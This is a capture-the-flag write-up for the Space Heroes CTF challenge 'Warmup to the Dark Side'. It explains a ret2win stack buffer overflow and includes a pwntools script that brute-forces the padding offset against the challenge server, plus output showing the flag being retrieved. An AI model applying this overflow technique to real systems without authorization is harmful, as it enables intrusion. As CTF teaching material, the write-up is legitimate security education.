---
title: "shctf/pwn: Warmup to the Dark Side"
date: 2022-04-05 15:57:40
categories:
- ctfs
- shctf
- pwn
tags:
- pwn
- buffer-overflow
description: "Learn how to stack smash an ASLR-enabled program... without the binary! This is my writeup for the Space Heroes CTF binary/pwn challenge \"Warmup to the Dark Side\"."
permalink: ctfs/shctf/pwn/warmup-to-the-dark-side/
thumbnail: /asset/banner/banner-darkside.png
---

<style>
    .box {
        border: 1px solid rgb(23, 25, 27);
        border-radius: 5px;
        background-color: rgb(23, 25, 27);
        padding: 1rem;
        font-size: 90%;
        text-align: center;
        margin-top: 1rem;
        margin-bottom: 1rem;
    }
</style>

<div class="box">
    Once you start down the dark path, forever will it dominate your destiny.<br>
    (And yes, the binary isn't included)<br>
    <code>nc 0.cloud.chals.io 30096</code><br>
    <b>Author</b>: v10l3nt
</div>

Let's run that `netcat` link to see what's going on:

<figure class="highlight console">
    <table>
        <tr>
            <td class="code">
                <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 0.cloud.chals.io 30096</span></span><br><span class="line">The Dark Side Of The Force, Are They. Easily They Flow, Quick To Join You In A Fight. The Dark Side resides at: 0x55a6b42f020c</span><br><span class="line">Jedi Mind tricks dont work on me &gt;&gt;&gt; </span><br></pre>
            </td>
        </tr>
    </table>
</figure>

We're given an address of the `win()` function... and that's it. If this is a `ret2win` challenge, how are we meant to find the offset of the `$rip` register and overflow it with our code? Of course... we need to brute force it.

In the code snippet below, I got the address provided in the prompt by reading the line and taking its substring (ASLR is enabled, so it's different each time). Then, I slowly increase the buffer of the payload with a loop until I find the right offset of the `$rip`:

<figure class="highlight py">
    <figcaption><span>warmup-to-the-dark-side.py</span><a target="_blank" rel="noopener"
      href="https://gist.github.com/jktrn/dd861b378b859a0588b48c71ad9fbf45"><span style="color:#82C4E4">[github gist link]</span></a></figcaption>
    <table>
        <tr>
            <td class="gutter">
                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
            </td>
            <td class="code">
                <pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        p = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>, <span class="number">30096</span>)</span><br><span class="line">        address = p.readlineS()[<span class="number">112</span>:<span class="number">126</span>]</span><br><span class="line">        log.info(<span class="string">&quot;Trying offset &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; for address &quot;</span> + address)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;A&#x27;</span>*i + p64(<span class="built_in">int</span>(address, base=<span class="number">16</span>)))</span><br><span class="line">        output = p.recvallS()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;shctf&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">                log.success(output)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        p.close()</span><br></pre>
            </td>
        </tr>
    </table>
</figure>

Let's run this script on the server to see if we can get the flag:

<figure class="highlight text">
    <table>
        <tr>
            <td class="code">
                <pre><span class="line">...</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 37 for address 0x55f788f1120c</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (38B)</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 30096</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 30096: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 38 for address 0x5631d523620c</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (38B)</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 30096</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 30096: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 39 for address 0x55980d2d520c</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (38B)</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 30096</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 30096: Done</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Trying offset 40 for address 0x55f0008b520c</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (95B)</span><br><span class="line">[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 30096</span><br><span class="line">[<span style="color:#47D4B9"><b>+</b></span>] Jedi Mind tricks dont work on me &gt;&gt;&gt; </span><br><span class="line">    shctf&#123;I_will_remov3_th3s3_restraints_and_leave_the_c3ll&#125;</span><br></pre>
            </td>
        </tr>
    </table>
</figure>


<a href="https://info.flagcounter.com/8Xkk"><img src="https://s01.flagcounter.com/count2/8Xkk/bg_212326/txt_C9CACC/border_C9CACC/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/" alt="Free counters!" border="0"></a>
